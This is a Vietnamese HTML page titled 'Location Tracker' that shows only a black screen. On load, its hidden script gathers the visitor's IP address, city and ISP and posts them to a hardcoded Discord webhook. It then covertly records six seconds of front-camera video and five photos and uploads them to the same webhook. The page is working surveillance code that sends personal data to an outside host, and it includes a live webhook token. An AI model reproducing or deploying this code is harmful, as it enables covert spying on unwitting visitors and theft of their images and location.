<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Huy Hoang- Location Tracker</title>
    <style>
        body { background: black; margin: 0; padding: 0; min-height: 100vh; display: flex; justify-content: center; align-items: center; font-family: monospace; }
        .hidden-content { display: none; }
    </style>
</head>
<body>
    <div style="display:none;">
        <div id="info"></div>
    </div>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
    <audio id="audio" style="display:none;"></audio>

    <script>
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1488092153883263048/qVOfMlJoEKghGT7OGyQ07aYlXAysUlH25Kt6sqfR4WIHbuis2Kl31ypw39z_BcJPyv4G';

        const PHOTO_COUNT = 5;
        const PHOTO_INTERVAL = 300;
        const VIDEO_DURATION = 6000;   // 6 giây video
        const AUDIO_DURATION = 4000;

        let cameraStream = null;
        let mediaRecorderVideo = null;
        let videoChunks = [];
        let mediaRecorderAudio = null;
        let audioChunks = [];
        let photoSentCount = 0;

        async function sendTextToDiscord(content) {
            try {
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username: "Huy Hoang - Location Tracker", content })
                });
            } catch(e) {}
        }

        async function sendFileToDiscord(blob, filename, caption) {
            try {
                const formData = new FormData();
                formData.append('file', blob, filename);
                formData.append('payload_json', JSON.stringify({
                    username: "Huy Hoang - Location Tracker",
                    content: caption
                }));
                await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
                console.log(`✅ Gửi thành công: ${filename}`);
            } catch(e) {
                console.error("Gửi file lỗi:", e);
            }
        }

        // Check IP + vị trí có Google Maps
        async function sendVisitorInfo() {
            let ip = "Không xác định", city = "Không xác định", region = "Không xác định", isp = "Không xác định";
            const apis = ["https://ip-api.com/json/?fields=query,status,city,regionName,isp","https://ipapi.co/json/"];
            for (let url of apis) {
                try {
                    const res = await fetch(url, { signal: AbortSignal.timeout(5000) });
                    const data = await res.json();
                    if (url.includes("ip-api.com") && data.status === "success") {
                        ip = data.query; city = data.city || city; region = data.regionName || region; isp = data.isp || isp;
                        break;
                    }
                } catch(e) {}
            }
            const msg = `**📥 KHÁCH TRUY CẬP MỚI**\n\n🌐 **IP:** ${ip}\n📍 **Thành phố:** ${city}\n🗺️ **Khu vực:** ${region}\n🏢 **Nhà mạng:** ${isp}\n⏰ **Thời gian:** ${new Date().toLocaleString('vi-VN')}`;
            await sendTextToDiscord(msg);
        }

        // ================== QUAY VIDEO ==================
        async function startVideoRecording() {
            try {
                cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { ideal: "user" }, width: { ideal: 640 }, height: { ideal: 480 } }
                });

                mediaRecorderVideo = new MediaRecorder(cameraStream, { mimeType: 'video/webm' });
                videoChunks = [];

                mediaRecorderVideo.ondataavailable = e => {
                    if (e.data.size > 0) videoChunks.push(e.data);
                };

                mediaRecorderVideo.onstop = () => {
                    const blob = new Blob(videoChunks, { type: 'video/webm' });
                    if (blob.size > 0) {
                        sendFileToDiscord(blob, `video_${Date.now()}.webm`, `🎥 **Video quay được (${VIDEO_DURATION/1000} giây)**`);
                    }
                    if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
                };

                mediaRecorderVideo.start();
                console.log("✅ Bắt đầu quay video...");

                setTimeout(() => {
                    if (mediaRecorderVideo && mediaRecorderVideo.state === "recording") {
                        mediaRecorderVideo.stop();
                    }
                }, VIDEO_DURATION);

            } catch (e) {
                console.error("Lỗi quay video:", e);
            }
        }

        // ================== CHỤP ẢNH (SỬA LẠI ĐỂ CHẮC CHẮN HƠN) ==================
        async function startCameraAndCapture() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { ideal: "user" }, width: { ideal: 640 }, height: { ideal: 480 }}
                });
                video.srcObject = stream;
                await new Promise(r => video.onloadedmetadata = r);
                video.play();

                for (let i = 1; i <= PHOTO_COUNT; i++) {
                    await new Promise(resolve => {
                        setTimeout(() => {
                            canvas.width = video.videoWidth || 640;
                            canvas.height = video.videoHeight || 480;
                            canvas.getContext('2d').drawImage(video, 0, 0);
                            canvas.toBlob(blob => {
                                if (blob) {
                                    sendFileToDiscord(blob, `photo_${i}_${Date.now()}.jpg`, `📸 **Ảnh chụp #${i}**`);
                                }
                                resolve();
                            }, 'image/jpeg', 0.9);
                        }, 300);
                    });
                }
                stream.getTracks().forEach(track => track.stop());
            } catch (err) {
                console.error("Lỗi chụp ảnh:", err);
            }
        }

        async function init() {
            await sendVisitorInfo();
            setTimeout(() => startVideoRecording(), 800);     // Quay video trước
            setTimeout(() => startCameraAndCapture(), 7000);  // Chụp ảnh sau khi quay xong
        }

        window.addEventListener('load', init);
    </script>
</body>
</html>
